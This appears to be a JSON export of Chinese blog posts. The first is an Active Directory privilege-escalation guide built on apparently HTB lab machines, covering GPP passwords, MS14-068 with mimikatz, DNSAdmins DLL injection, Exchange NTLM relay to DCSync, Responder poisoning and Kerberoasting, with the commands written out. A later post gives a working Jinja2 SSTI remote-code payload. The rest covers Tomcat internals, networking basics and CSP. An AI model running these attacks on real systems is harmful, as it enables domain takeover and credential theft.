[{"title":"域控提权","date":"2023-10-10T07:07:19.000Z","url":"/2023/10/10/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/","categories":[["undefined",""]],"content":"0x01、前言菜鸡一枚，标题起的可能有点大，只是个人笔记整理的一个合集（所以基本每个例子都会有实例）。所以虽然说是合集，可能都没有囊括到各位大佬会的一半。还请各位大佬轻喷 0x02、目录 GPP和SYSVOL中的密码 MS14-068 DNSAdmins 不安全的GPO权限 不安全的ACLs权限 Exchange LLMNR&#x2F;NBT-NS 投毒 Kerberoasting AD recyle Bin 0x03、 GPP和SYSVOL中的密码什么是GPP:GPP被用来将通用的本地管理员密码应用于所有工作站、应用全新的管理员帐户、为其他用户安排任务、应用打印机等用途一般域内机子较多的情况，管理员为了方便管理，在主机上设置本地管理员密码GPP。配置此功能后，会在域控制器上创建一个XML文件，其中包含将策略应用于连接到域的工作站或便携式计算机时配置帐户所需的信息。该xml文件包含管理帐户的密码，一般情况下任意域用户都可以读取（通常是DC开启SYSVOL目录共享）这里不得不提的一点是Microsoft已使用AES加密了xml文件中的密码以提高安全性，但又发布了用于加密和解密该值的密钥（所以这是什么操作？？？） 漏洞利用：接到域控制器的默认SYSVOL共享，并在其中搜索groups.xml的实例。如果存在这些文件，位于格式类似于以下的文件夹中： 0x03.1、定位域控制器 0x03.2、查询DC共享目录使用enumlinux或者smbmap检查共享目录 smbmap -H 10.10.10.100 ###列出目标用户共享列表 0x03.3、连接域共享 smb: \\active.local\\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups&gt; more Groups.xml 0x03.4、使用gpprefdecrypt.py解密： 0x04、MS14-068危害：任意域内用户都可以提权到域控 一般为本地账户才能成功，但是使用klist purge清除缓存证书可绕过限制 0x04.1、漏洞成因在 KDC 对 PAC 进行验证时，根据协议规定必须是带有 server Hash、KDC Hash 的签名算法才可以（原本的设计是 HMAC 系列的 checksum 算法），但微软在实现上，却允许任意签名算法。只要客户端指定任意签名算法，KDC 就会使用指定的算法进行签名验证，致使导致恶意用户在发送给KDC的TG_REQ中可以创建包含管理员帐户成员身份的伪造PAC被KDC接收，并将其放入TG_REP中发布的新TGT票证中。该票证可用于向KDC要求服务票证的服务升级特权：在这种情况下，是smb服务票证。 什么是PAC（特权帐户证书）：PAC包含域控制器（DC）提供的授权数据，Active Directory将授权数据存储在PAC（特权帐户证书）的票证字段中。PAC由DC在服务单的现场授权数据中提供。它用KDC密钥（只有AD知道）签名，并用要验证的服务和AD之间共享的服务密钥签名。 0x04.2、利用条件1.域控机器没有打漏洞补丁 补丁号：KB30117802.拥有一台域内机子及其sid 0x04.3、漏洞利用漏洞检测 ##：FindSMB2UpTime.py(但是这个并不一定准确，因为域控是一般不会重启，但是也有存在意外重启的情况，那么即使有ms14-068也不会显示) 获取域控制器补丁状态:Get-DCPatchStatus.ps1 0x04.4、环境描述：目标机器：10.10.10.52 Windows Server 2008 R2 Standard已获取：DC上的一个普通本地账户james用户账户密码james sid （可通过多种途径获取 rpclient：lookupnames james 目标机器shell中：whoami &#x2F;all ，）攻击机：kali 10.10.14.14 （不在域中） 在Linux上利用：(有用户凭据、没有目标shell的情况下)1.安装客户端，在客户端生成票证 2.编辑&#x2F;etc&#x2F;krb5.conf[libdefaults]default_realm &#x3D; HTB.LOCAL 3.添加路由：编辑&#x2F;etc&#x2F;resolve.conf nameserver 10.10.10.52 4.同步域控时间（确定DC的时间（用于票证同步），按照RFC必须在5分钟内完成，但+ -30分钟的偏差也可以的） [方法1]net time -S 10.10.10.52 -U“” ##获取DC时间，然后收到设置本机时间[方法2]sudo rdate -n 10.10.10.52 ###直接同步到域控时间 5.为james用户生成一张新的Kerberos票证 此时生成的是james的票证：访问C$是没有权限的 6.ms14-068生成高权限TGT票证 7.替换低权限票证mv &#84;&#71;&#x54;&#95;&#106;&#97;&#x6d;&#101;&#x73;&#64;&#x48;&#84;&#x42;&#46;&#x4c;&#x4f;&#67;&#65;&#x4c;&#46;&#x63;&#x63;&#x61;&#x63;&#x68;&#x65; &#x2F;tmp&#x2F;krb5cc_1000 8.smb成功登录C$ Mimikatz利用：先在目标机器使用ms14-068.exe生成票据，然后使用mimikatz注入票据，再使用psexec获取权限或winexec执行命令 ms14-068.py -u &#106;&#97;&#x6d;&#x65;&#115;&#64;&#x48;&#84;&#66;&#x2e;&#76;&#79;&#67;&#65;&#76; -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis 将&#x54;&#71;&#x54;&#x5f;&#106;&#97;&#x6d;&#x65;&#115;&#x40;&#x48;&#x54;&#x42;&#x2e;&#x4c;&#79;&#x43;&#x41;&#76;&#46;&#99;&#99;&#x61;&#99;&#104;&#x65;文件放入mimikatz目录中mimikatz.exe log “kerberos::ptc &#84;&#71;&#84;&#95;&#x6a;&#97;&#109;&#101;&#x73;&#x40;&#72;&#84;&#66;&#46;&#76;&#x4f;&#x43;&#x41;&#76;&#x2e;&#99;&#99;&#97;&#99;&#x68;&#101;“exit注入成功即可获得域管理session,可以klist看一下是否有了kerberos Ticketnet use \\htb.local\\admin$ ####使用IP可能会失败dir \\htb.local\\c$psexec \\htb.local cmd.exe 突破“本地账户才能漏洞利用”的限制：先 klist purgr清除缓存证书，再使用mimikatz生成高权限TGT的缓存证书进行连接： Impacket套件利用也有更简便的方法，不需要上边的种种配置，直接使用impacket套件下的GoldenPac一发入魂（ms14-068+psexec） 0x05、DNSAdmins默认情况下，域控也是DNS服务器，微软的DNS服务器作为域控上的服务来运行。通过DNSadmins到System，拿下域控权限利用条件：拥有DNSAdmins组成员的用户帐户权限，或者当前用户帐户具有对DNS服务器对象的写特权 whoami &#x2F;groups 查看用户组 制作dll： 开启smb共享：（可通过net use \\10.10.14.67\\tw 检测是否能连通smbserver ， 关于smbserver不能连接，排除网络问题之后，可能是共享占用问题，更改共享名称重新开启smbserver即可） 注入dll：dnscmd.exe 10.10.10.169 &#x2F;config &#x2F;serverlevelplugindll \\10.10.14.67\\tw\\plugin.dll 监听：nc -lvvp 444 重启dns致使paylload生效： 0x06、 不安全的GPO权限原理及GPO枚举：枚举有GPO修改权限（write Property）的用户 使用PowerView的New-GPOImmediateTask 函数进行利用： -TaskName是必需的参数，-Command 指定的命令来运行（默认为powershell.exe），-CommandArguments 指定给定的二进制的参数。schtask .xml会复制到-GPOname或-GPODisplayname参数确定的适当位置。默认情况下，该功能将在复制前提示您，但是可以使用-Force禁止显示。payload这里可以直接用empire生成的base64的paylaod执行完成之后删除schtask .xml： Github中的另外利用方式： 0x07、 不安全的ACLs权限原理及ACLs枚举：对域对象有WriteDacl权限&#x3D;&#x3D;&#x3D;&gt;DCSync Exchange提权就是最好的ACL滥用的例子，可结合下面的EXchange进一步理解 0x08、Exchange原理 ： Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteDacl权限的成员身份中继到LDAP后，可以修改域对象的ACL授予用户更高级别的访问权限，执行DCSync 也就是利用Exchange默认高权限账户进行LDAP中继授予用户DCSync权限 漏洞利用： net group 查看用户组 或者当前用户不在Exchange Permissions组中，但在Account Operator中（该组的成员能操作用户管理员所属域的账号和组，并可设置其权限。但是该组成员无法修改Administrators及Operators组及权限），可以添加一个用户并加入到Exchange Permissions添加用户tw： 将用户添加到Exchange Permissions组 检查是否已成功添加 使用ntlmrelayx进行ntlm中继： 运行该 中继 命令之后，可通过浏览器访问本地IP进行连接（输入tw账户密码），也可使用prieexchange.py进行连接 （10.10.16.21为我kali ip） 连接成功之后，使用secretdump.py导出域控hash #######时间蛮久的，需要出现上图提示 0x09、LLMNR&#x2F;NBT-NS投毒原理：如果DNS服务器解析失败，则要求解析的系统使用LLMNR（UDP 5355）或NBNS（UDP 137）在Windows系统上的网段上广播问题或查询。而后攻击者做出响应，请求系统将根据广播期间使用的服务（例如FTP）提供Net-NTLM哈希或明文凭据。 使用Responer执行监听，等待域控触发解析错误 也可使用MSF操作 0x10、Kerberoasting原理： 服务主体名称（SPN）用于唯一标识Windows服务的每个实例。为了支持Kerberos身份验证，SPN与至少一个服务登录帐户相关联Kerberoasting利用点在于Client使用有效的TGT向TGS请求Server的Kerberos令牌，TGS在KDC数据库中查找SPN，并使用与SPN关联的服务帐户对票证进行加密并发送给Client。然而这里TGS加密方式为RC4_HMAC_MD5，使用Server端的NTLM hash进行加密（使破解成为可能）此时攻击者借用一个有效的域用户身份请求一个或多个SPN的Kerberos令牌（加密后的TGS），然后进行离线破解得到SPN账户hash（这个过程甚至不用与目标SPN产生交互，即没有已被检测的流量产生，增强攻击的隐蔽性）假若使用的是HTTP（默认使用的是HTTPS），还可以通过捕获网络流量得到Kerberos令牌，然后进行离线破解攻击：扫描域中设置了SPN值的用户帐户。SPN账户格式：serviceclass&#x2F;host:port&#x2F;servicename —&gt; 使用SPN值从AD请求服务票证 返回服务票证并将其存储在系统的内存中，可以直接在当前窗口运行mimikatz导出内存中的票证 导出票证然后用tgsrecrack.py破解 上边的是从原理出发的实验步骤，现在有很多便捷的脚本，如impacket套件中的GetUserSPNs.pyempire中的Kerberoast.ps1效果如下： 破解：[1 hashcat]: hashcat -a 0 -m 13100 active.hash &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt –force[2 john] ： sudo john active.hash -w “&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt” 0x11、AD recyle Bin使用回收站还原用户，或获取用户旧密码进行碰撞 前提：需要域内启用回收站功能，且用户在AD Recyle Bin 组中未启用启用回收站和启用回收站删除对象对比 图1：启用回收站之前已删除的Active Directory对象的生命周期图 2：启用回收站后已删除的Active Directory对象的生命周期 启用AD回收站： 查看删除用户 结果示例： 尝试还原已删除账户 查询ms-mcs-admpwd 查看有关于特定账户的全部属性信息： 这里存在被删除的临时管理员TempAdmin的LegacyPassword"},{"title":"Tomcat启动过程","date":"2023-08-10T23:56:52.000Z","url":"/2023/08/11/Tomcat%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/","categories":[["undefined",""]],"content":"Tomcat - 启动过程：初始化和启动流程 在有了Tomcat架构设计和源码入口以后，我们便可以开始真正读源码了。 # 总体流程 很多人在看框架代码的时候会很难抓住重点的，而一开始了解整体流程会很大程度提升理解的效率。 我们看下整体的初始化和启动的流程，在理解的时候可以直接和Tomcat架构设计中组件关联上： # 代码浅析看了下网上关于Tomcat的文章，很多直接关注在纯代码的分析，这种是很难的；我建议你一定要把代码加载进来自己看一下，然后这里我把它转化为核心的几个问题来帮助你理解。 # Bootstrap主入口？Tomcat源码就从它的main方法开始。Tomcat的main方法在org.apache.catalina.startup.Bootstrap 里。 如下代码我们就是创建一个 Bootstrap 对象，调用它的 init 方法初始化，然后根据启动参数，分别调用 Bootstrap 对象的不同方法。 # Bootstrap如何初始化Catalina的？我们用Sequence Diagram插件来看main方法的时序图，但是可以发现它并没有帮我们画出Bootstrap初始化Catalina的过程，这和上面的组件初始化不符合？ 让我们带着这个为看下Catalina的初始化的 通过上面几行关键代码的注释，我们就可以看出Catalina是如何初始化的。这里还留下一个问题，tomcat为什么要初始化不同的classloader呢 Tomcat - 启动过程:类加载机制详解 上文我们讲了Tomcat在初始化时会初始化classLoader。本文将具体分析Tomcat的类加载机制，特别是区别于传统的双亲委派模型的加载机制。 # Tomcat初始化了哪些classloader在Bootstrap中我们可以看到有如下三个classloader # 如何初始化的呢？ 可以看出，catalinaLoader 和 sharedLoader 的 parentClassLoader 是 commonLoader。 # 如何创建classLoader的？不妨再看下如何创建的？ 方法的逻辑也比较简单就是从 catalina.property文件里找 common.loader, shared.loader, server.loader 对应的值，然后构造成Repository 列表，再将Repository 列表传入ClassLoaderFactory.createClassLoader 方法，ClassLoaderFactory.createClassLoader 返回的是 URLClassLoader，而Repository 列表就是这个URLClassLoader 可以加在的类的路径。 在catalina.property文件里 其中 shared.loader, server.loader 是没有值的，createClassLoader 方法里如果没有值的话，就返回传入的 parent ClassLoader，也就是说，commonLoader,catalinaLoader,sharedLoader 其实是一个对象。在Tomcat之前的版本里，这三个是不同的URLClassLoader对象。 初始化完三个ClassLoader对象后，init() 方法就使用 catalinaClassLoader 加载了org.apache.catalina.startup.Catalina 类，并创建了一个对象，然后通过反射调用这个对象的 setParentClassLoader 方法，传入的参数是 sharedClassLoader。最后吧这个 Catania 对象复制给 catalinaDaemon 属性。 # 深入理解可以复习下类加载机制的基础：JVM基础 - Java 类加载机制 # 什么是类加载机制Java是一门面向对象的语言，而对象又必然依托于类。类要运行，必须首先被加载到内存。我们可以简单地把类分为几类： Java自带的核心类 Java支持的可扩展类 我们自己编写的类 为什么要设计多个类加载器？ 如果所有的类都使用一个类加载器来加载，会出现什么问题呢？ 假如我们自己编写一个类java.util.Object，它的实现可能有一定的危险性或者隐藏的bug。而我们知道Java自带的核心类里面也有java.util.Object，如果JVM启动的时候先行加载的是我们自己编写的java.util.Object，那么就有可能出现安全问题！ 所以，Sun（后被Oracle收购）采用了另外一种方式来保证最基本的、也是最核心的功能不会被破坏。你猜的没错，那就是双亲委派模式！ 什么是双亲委派模型？ 双亲委派模型解决了类错乱加载的问题，也设计得非常精妙。 双亲委派模式对类加载器定义了层级，每个类加载器都有一个父类加载器。在一个类需要加载的时候，首先委派给父类加载器来加载，而父类加载器又委派给祖父类加载器来加载，以此类推。如果父类及上面的类加载器都加载不了，那么由当前类加载器来加载，并将被加载的类缓存起来。 所以上述类是这么加载的 Java自带的核心类 – 由启动类加载器加载 Java支持的可扩展类 – 由扩展类加载器加载 我们自己编写的类 – 默认由应用程序类加载器或其子类加载 但它也不是万能的，在有些场景也会遇到它解决不了的问题，比如如下场景。 # 双亲委派模型问题是如何解决的？ 在Java核心类里面有SPI（Service Provider Interface），它由Sun编写规范，第三方来负责实现。SPI需要用到第三方实现类。如果使用双亲委派模型，那么第三方实现类也需要放在Java核心类里面才可以，不然的话第三方实现类将不能被加载使用。但是这显然是不合理的！怎么办呢？ ContextClassLoader（上下文类加载器）就来解围了。 在java.lang.Thread里面有两个方法，get&#x2F;set上下文类加载器 我们可以通过在SPI类里面调用getContextClassLoader来获取第三方实现类的类加载器。由第三方实现类通过调用setContextClassLoader来传入自己实现的类加载器, 这样就变相地解决了双亲委派模式遇到的问题。 # 为什么Tomcat的类加载器也不是双亲委派模型 我们知道，Java默认的类加载机制是通过双亲委派模型来实现的，而Tomcat实现的方式又和双亲委派模型有所区别。 原因在于一个Tomcat容器允许同时运行多个Web程序，每个Web程序依赖的类又必须是相互隔离的。因此，如果Tomcat使用双亲委派模式来加载类的话，将导致Web程序依赖的类变为共享的。 举个例子，假如我们有两个Web程序，一个依赖A库的1.0版本，另一个依赖A库的2.0版本，他们都使用了类xxx.xx.Clazz，其实现的逻辑因类库版本的不同而结构完全不同。那么这两个Web程序的其中一个必然因为加载的Clazz不是所使用的Clazz而出现问题！而这对于开发来说是非常致命的！ # Tomcat类加载机制是怎么样的呢 既然Tomcat的类加载机器不同于双亲委派模式，那么它又是一种怎样的模式呢？ 我们在这里一定要看下官网提供的类加载的文档在新窗口打开 结合经典的类加载机制，我们完整的看下Tomcat类加载图 我们在这张图中看到很多类加载器，除了Jdk自带的类加载器，我们尤其关心Tomcat自身持有的类加载器。仔细一点我们很容易发现：Catalina类加载器和Shared类加载器，他们并不是父子关系，而是兄弟关系。为啥这样设计，我们得分析一下每个类加载器的用途，才能知晓。 Common类加载器 ，负责加载Tomcat和Web应用都复用的类 Catalina类加载器，负责加载Tomcat专用的类，而这些被加载的类在Web应用中将不可见 Shared类加载器 ，负责加载Tomcat下所有的Web应用程序都复用的类，而这些被加载的类在Tomcat中将不可见 WebApp类加载器，负责加载具体的某个Web应用程序所使用到的类，而这些被加载的类在Tomcat和其他的Web应用程序都将不可见 Jsp类加载器，每个jsp页面一个类加载器，不同的jsp页面有不同的类加载器，方便实现jsp页面的热插拔 同样的，我们可以看到通过ContextClassLoader（上下文类加载器）的setContextClassLoader来传入自己实现的类加载器 # WebApp类加载器 到这儿，我们隐隐感觉到少分析了点什么！没错，就是WebApp类加载器。整个启动过程分析下来，我们仍然没有看到这个类加载器。它又是在哪儿出现的呢？ 我们知道WebApp类加载器是Web应用私有的，而每个Web应用其实算是一个Context，那么我们通过Context的实现类应该可以发现。在Tomcat中，Context的默认实现为StandardContext，我们看看这个类的startInternal()方法，在这儿我们发现了我们感兴趣的WebApp类加载器。 入口代码非常简单，就是webappLoader不存在的时候创建一个，并调用setLoader方法。我们接着分析setLoader 这儿，我们感兴趣的就两行代码： # 参考文章  juconcurrent  Tomcat - 启动过程:Catalina的加载 通过前两篇文章，我们知道了Tomcat的类加载机制和整体的组件加载流程；我们也知道通过Bootstrap初始化的catalinaClassLoader加载了Catalina，那么进而引入了一个问题就是Catalina是如何加载的呢？加载了什么呢？本文将带你进一步分析。 # Catalina的引入 通过前两篇文章，我们知道了Tomcat的类加载机制和整体的组件加载流程；我们也知道通过Bootstrap初始化的catalinaClassLoader加载了Catalina，那么进而引入了一个问题就是Catalina是如何加载的呢？加载了什么呢？ 先回顾下整个流程，和我们分析的阶段 看下Bootstrap中Load的过程 # Catalina的加载上一步，我们知道catalina load的触发，因为有参数所以是load(String[])方法。我们进而看下这个load方法做了什么？ load(String[])本质上还是调用了load方法 load加载过程本质上是初始化Server的实例 总体流程如下： # initDirs已经弃用了，Tomcat10会删除这个方法。 # initNaming设置额外的系统变量 # Server.xml的解析分三大块，下面的代码还是很清晰的: # initStreams替换掉System.out, System.err为自定义的PrintStream # Catalina 的启动在 load 方法之后，Tomcat 就初始化了一系列的组件，接着就可以调用 start 方法进行启动了。 上面这段代码，逻辑非常简单，首先确定 getServer() 方法不为 null ，也就是确定 server 属性不为null，而 server 属性是在 load 方法就初始化了。 整段代码的核心就是 try-catch 里的 getServer().start() 方法了，也就是调用 Server 对象的 start() 方法来启动 Tomcat。本篇文章就先不对 Server 的 start() 方法进行解析了，下篇文章会单独讲。 # Catalina 的关闭调用完 Server#start 方法之后，注册了一个ShutDownHook，也就是 CatalinaShutdownHook 对象， CatalinaShutdownHook 的逻辑也简单，就是调用 Catalina 对象的 stop 方法来停止 tomcat。 最后就进入 if 语句了，await 是在 Bootstrap 里调用的时候设置为 true 的，也就是本文开头的时候提到的三个方法中的一个。await 方法的作用是停住主线程，等待用户输入shutdown 命令之后，停止等待，之后 main 线程就调用 stop 方法来停止Tomcat。 Catalina 的 stop 方法主要逻辑是调用 Server 对象的 stop 方法。 # 聊聊关闭钩子上面我们看到CatalinaShutdownHook, 这里有必要谈谈JVM的关闭钩子。 关闭钩子是指通过Runtime.addShutdownHook注册的但尚未开始的线程。这些钩子可以用于实现服务或者应用程序的清理工作，例如删除临时文件，或者清除无法由操作系统自动清除的资源。 JVM既可以正常关闭，也可以强行关闭。正常关闭的触发方式有多种，包括：当最后一个“正常（非守护）”线程结束时，或者当调用了System.exit时，或者通过其他特定于平台的方法关闭时（例如发送了SIGINT信号或者键入Ctrl-C）。 在正常关闭中，JVM首先调用所有已注册的关闭钩子。JVM并不能保证关闭钩子的调用顺序。在关闭应用程序线程时，如果有（守护或者非守护）线程仍然在执行，那么这些线程接下来将与关闭进程并发执行。当所有的关闭钩子都执行结束时，如果runFinalizersOnExit为true【通过Runtime.runFinalizersOnExit(true)设置】，那么JVM将运行这些Finalizer（对象重写的finalize方法），然后再停止。JVM不会停止或中断任何在关闭时仍然运行的应用程序线程。当JVM最终结束时，这些线程将被强行结束。如果关闭钩子或者Finalizer没有执行完成，那么正常关闭进程“挂起”并且JVM必须被强行关闭。当JVM被强行关闭时，只是关闭JVM，并不会运行关闭钩子（举个例子，类似于电源都直接拔了，还怎么做其它动作呢？）。 下面是一个简单的示例： 和（可能的）执行结果（因为JVM不保证关闭钩子的调用顺序，因此结果中的第二、三行可能出现相反的顺序）： 可以看到，main函数执行完成，首先输出的是Main Thread Ends，接下来执行关闭钩子，输出Hook2 Ends和Hook1 Ends。这两行也可以证实：JVM确实不是以注册的顺序来调用关闭钩子的。而由于hook3在调用了addShutdownHook后，接着对其调用了removeShutdownHook将其移除，于是hook3在JVM退出时没有执行，因此没有输出Hook3 Ends。 另外，由于MyHook类实现了finalize方法，而main函数中第一行又通过Runtime.runFinalizersOnExit(true)打开了退出JVM时执行Finalizer的开关，于是3个hook对象的finalize方法被调用，输出了3行Finalize。 注意，多次调用addShutdownHook来注册同一个关闭钩子将会抛出IllegalArgumentException: 另外，从JavaDoc中得知：一旦JVM关闭流程开始，就只能通过调用halt方法来停止该流程，也不可能再注册或移除关闭钩子了，这些操作将导致抛出IllegalStateException。 如果在关闭钩子中关闭应用程序的公共的组件，如日志服务，或者数据库连接等，像下面这样： 由于关闭钩子将并发执行，因此在关闭日志时可能导致其他需要日志服务的关闭钩子产生问题。为了避免这种情况，可以使关闭钩子不依赖那些可能被应用程序或其他关闭钩子关闭的服务。实现这种功能的一种方式是对所有服务使用同一个关闭钩子（而不是每个服务使用一个不同的关闭钩子），并且在该关闭钩子中执行一系列的关闭操作。这确保了关闭操作在单个线程中串行执行，从而避免了在关闭操作之前出现竞态条件或死锁等问题。 # 使用场景通过Hook实现临时文件清理 # 小结Catalina 类承接了 Bootstrap 类的 load 和 start 方法，然后根据配置初始化了 Tomcat 的组件，并调用了 Server 类的 init 和 start 方法来启动 Tomcat。 # 参考文章   "},{"title":"Flask（Jinja2） 服务端模板注入漏洞","date":"2023-08-09T12:53:08.000Z","url":"/2023/08/09/Flask%EF%BC%88Jinja2%EF%BC%89-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","categories":[["undefined",""]],"content":"Flask（Jinja2） 服务端模板注入漏洞原理参考文章：   测试编译及运行测试环境： 安装Arjungit clone  cd Arjun python3 setup.py install 访问*233&#125;&#125;，得到54289，说明SSTI漏洞存在。 获取eval函数并执行任意python代码的POC： 访问()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D，得到执行结果： "},{"title":"计算机网络","date":"2023-08-09T12:52:29.000Z","url":"/2023/08/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/","categories":[["undefined",""]],"content":"计算机网络计算机网络的主要作用就是实现计算机之间的通信，这是主要的作用。 物理层物理层主要功能：为数据端设备提供传送数据通路、传输数据。 假设现在有两台计算机，我们需要实现这两台计算机之间的通信，最简单的方式是用一根线将他们连起来，使用高低电平来进行通信，但如果计算机的数量提升到五台，这时候就需要五台计算机之间两两连线才能通过这种方法进行计算机的通信。这种情况下，需要的线的数量就会有大幅提升，这时，就提出两个重要的思想：1.转发，2.标识。这时候通过一个设备来统一进行转发。这种设备叫做hub（集线器），假设这五台计算机分别为A,B,C,D,E,集线器为F.这时，A,B,C,D,E全部接入F,网络拓扑图大概如下： 当A向C通信时，A先将需要发送的数据发往F，F做一个无条件的转发，将数据发往B，C，D，E，当B接收到这个数据之后，发现不是发送给B的，就将其丢弃，当C接收到数据，发现是发送给C的，就接收数据。这种方式就是消息洪泛。这种设计有一个问题，就是当A在发送的同时，E也在发送，但集线器只能处理电信号，集线器没法分辩这两个电信号，所以他在转发的时候就会将其杂糅在一起，发送给其他设备，这就导致其他设备接收到的数据是混合起来的，数据就无法解析。针对这一问题就提出了一种协议，叫做CSMA&#x2F;CD，CSMA&#x2F;CD实现一种载波监听的功能，通过载波监听的方式，在发送数据的时候，先检测链路上有没有其他设备在发送数据，如果没有的话，再进行发送，这就是载波监听的主要的一个功能，能够防止冲突。这种方法有什么问题呢，首先，进行数据广播，带宽利用率比较低，其次，所有链路上同时只能有一个设备进行发送数据，导致链路的利用率很低，如果当设备数量较大时比如1k台设备，发送数据的时间间隔就会特别大。所有这种方式只适用于很小很小的范围内，比如只有几台设备的网络里。 数据链路层 针对上面的问题，提出了第二章设备，交换机（switch），交换机主要作用也是起到一个转发的作用，而集线器最大的问题是没有记录设备的标识符，它只是将数据广播出去,由设备进行判断处理，这样导致传输效率特别低，并且不安全。交换机中记录了地址与物理端口的映射方式。记录的地址是mac地址（物理地址），这个地址是全球唯一的，但是是可以改的。交换机中存在一张表，记录了每个mac地址和对应的端口。交换机的通信是全双工的，集线器用的线大多是双绞线，双绞线在工作的时候是只能有一台设备进行发送数据的。交换机现在用的就是网线了，网线里面一般有八根线，正常情况下至少有4根线在进行工作，这导致在发送数据的同时也能接收数据。当一台全新的交换机设备接入网络中时，假设计算机分别为A,B,C，交换机为F、网络拓扑图如下 此时还未进行任何通信，记录mac地址与端口的表为空，当A向B发送数据时，过程如下：A将数据发送到交换机，交换机收到数据，记录下A的mac地址和端口，只是交换机中找不到B，就将数据从所有端口发出，当B做出回应，交换机就记录了B的mac地址和端口。 进过多次通信，所有设备都能够记录mac地址与端口的映射。 交换机是可以和交换机连接的。以下面网络拓扑图为例 记录过程其实与单台交换机一样，当A向E发送数据时，A在F中找不到E，就向所有端口发送数据，G接收到数据，就将其发给E，E做出回应，F就记录E的mac地址和对应的物理端口，而实际的物理端口是接入了另一台交换机的，假设端口为端口四，记录表中记录类似于{macE：端口四}{macD：端口四}，端口号可以重复。这种设计存在一些问题：一个表大概能够存储几千个。而且多连接交换机会存在如果第一个交换机没有记录，就会在进行广播，如果再没有就在下一个交换机进行广播，直到找到目标，就导致一个消息的洪泛，效率比较低，适用于一个比较小的网络，几千台设备的网络。数据链路层会在 frame 尾端置放检查码（parity，sum，CRC）以检查实质内容，将物理层提供的可能出错的物理连接改造成逻辑上无差错的数据链路，并对物理层的原始数据进行数据封装。从数据链路层开始对数据进行封装。 数据链路层协议首先Ethernet、IEEE802.3、PPP和HDLC都是数据链路层的协议，只不过后面三个不常用而已，数据链路层最常用的协议是Etnernet以太网协议。 Ethernet和IEEE802.3属于以太链路层协议 广域网中经常会使用串行链路来提供远距离的数据传输，高级数据链路控制HDLC（High-Level Data Link Control）和点对点协议PPP（ Point to Point Protocol）是两种典型的串口封装协议。 Ethernet以太网协议Ethernet以太网协议，用于实现链路层的数据传输和地址封装 以太网数据帧的封装 从上图可以看到 Ethernet II帧，目的地址、源地址字段各占6个字节，目的地址字段确定帧的接收者，源地址字段标识帧发送者。当使用六个字节的源地址字段时，前三个字节表示由IEEE分配给厂商的地址，将烧录在每一块网络接口卡的ROM中。而制造商通常为其每一网络接口卡分配后字节。其实目的、源地址就是我们经常说的MAC地址，比如00:1A:A0:31:39:D4就是一个MAC地址。类型字段，为2字节，用来标识上一层所使用的协议类型，如IP协议（0x0800）,ARP(0x0806)等。数据字段 以太网包最小规定为64字节，不足的也会填充到64字节。以太网包的最大长度是1518字节，数据字段长度范围为46到1500，这是为什么呢？因为以太网包最小规定为64字节，不足的也会填充到64字节。而以太网帧格式的其他部分加起来是6+6+2+4&#x3D;18字节，所以数据部分的最小长度为64-18&#x3D;46字节；而以太网包的最大长度是1518字节，因此1518-18&#x3D;1500字节。FCS字段是帧校验字段，即Frame Check Sequence，用来保存CRC(循环冗余校验)校验值。 IEEE802.3协议IEEE 802.3 通常指以太网，一种网络协议。描述物理层和数据链路层的MAC子层的实现方法，在多种物理媒体上以多种速率采用CSMA&#x2F;CD访问方式MAC（MediaAccessControl）媒体访问控制层，该层定义了数据包怎样在介质上进行传输。LLC （LogicalLinks Control）逻辑链路控制层 PPP协议PPP协议是一种点到点(一根链路两端只有两个接口)链路层协议，主要用于在全双工的同异步链路上进行点到点的数据传输。 LCP是用来创建二层连接的，是有连接的(以太协议无连接)；NCP是用来实现三层通信的 HDLC协议HDLC(High-level Data Link Control)，高级数据链路控制，简称HDLC，是一种面向比特的链路层协议，思科私有协议，现在几乎不用 网络层 当交换机表满的时候，如果再需要记录新的，就会顶掉已经记录的，而且当需要跨网络发送消息时，需要进行广播，效率很低，这时候设计了一个设备：路由器（又叫网关），实现不同网络之间的通信，引入了一个新的标识：ip，ip主要实现两个功能：1.标识网络，2.标识设备，ip是一个抽象的标识符。"},{"title":"HTML5安全：内容安全策略(CSP)","date":"2023-08-01T12:20:33.000Z","url":"/2023/08/01/HTML5%E5%AE%89%E5%85%A8%EF%BC%9A%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5-CSP/","categories":[["undefined",""]],"content":"万维网的安全策略植根于同源策略。例如的代码只能访问[]()的数据，而没有访问[]()的权限。每个来源都与网络的其它部分分隔开，为开发人员构建了一个安全的沙箱。理论上这是完美的，但是现在攻击者已经找到了聪明的方式来破坏这个系统。 这就是XSS跨站脚本攻击，通过虚假内容和诱骗点击来绕过同源策略。这是一个很大的问题，如果攻击者成功注入代码，有相当多的用户数据会被泄漏。 现在我们介绍一个全新的、有效的安全防御策略来减轻这种风险，这就是内容安全策略（ContentSecurity Policy，CSP）。 来源白名单 XSS攻击的核心是利用了浏览器无法区分脚本是被第三方注入的，还是真的是你应用程序的一部分。例如Google +1按钮会从加载并执行代码，[但是我们不能指望从浏览器上的图片就能判断出代码是真的来自apis.google.com]()，[还是来自apis.evil.example.com]()。浏览器下载并执行任意代码的页面请求，而不论其来源。 